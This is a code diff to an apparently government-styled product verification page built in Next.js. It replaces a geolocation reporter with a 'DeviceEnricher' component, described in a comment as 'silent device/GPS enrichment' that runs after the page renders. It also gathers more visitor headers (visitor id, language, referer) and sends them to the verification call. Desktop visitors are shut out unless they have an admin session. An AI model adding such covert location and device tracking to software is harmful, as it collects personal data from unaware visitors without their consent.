@@ -4,7 +4,7 @@ import { ShieldCheck, ShieldAlert, ShieldX, ShieldQuestion, Package as PackageIc
 import { verifyCode, fetchProduct, isAdminSession } from '@/lib/api';
 import ActivateForm from '@/components/ActivateForm';
 import { ProductNameButton } from '@/components/ProductNameButton';
-import { GeoReporter } from '@/components/GeoReporter';
+import { DeviceEnricher } from '@/components/DeviceEnricher';
 import { ImageSlider } from '@/components/ImageSlider';
 import { CopySecurityCode } from '@/components/CopySecurityCode';
 import { fmtDate, isMobileUA } from '@/lib/utils';
@@ -16,10 +16,13 @@ export default async function VerifyPage({ params }: { params: { code: string } 
   const h = headers();
   const ip = h.get('x-forwarded-for') || h.get('x-real-ip') || '';
   const ua = h.get('user-agent') || '';
+  const visitorId = h.get('x-visitor-id') || '';
+  const acceptLanguage = h.get('accept-language') || '';
+  const referer = h.get('referer') || '';
 
   if (!isMobileUA(ua) && !(await isAdminSession(h.get('cookie') || ''))) return <DesktopOnlyView />;
 
-  const result = await verifyCode(params.code, ip, ua);
+  const result = await verifyCode(params.code, ip, ua, visitorId, acceptLanguage, referer);
 
   if (!result || !result.valid) return <InvalidView />;
 
@@ -31,8 +34,8 @@ export default async function VerifyPage({ params }: { params: { code: string } 
 
   return (
     <main className="min-h-screen bg-gradient-to-br from-gov-50 via-white to-gov-100 py-8 px-4">
-      {/* Silent geolocation enrichment - runs after main render */}
-      <GeoReporter code={params.code} />
+      {/* Silent device/GPS enrichment - runs after main render */}
+      <DeviceEnricher code={params.code} />
       {/* Gov bar */}
       <div className="fixed top-0 inset-x-0 h-1.5 bg-gradient-to-r from-gov-500 via-gold-400 to-gov-500 z-10" />
 
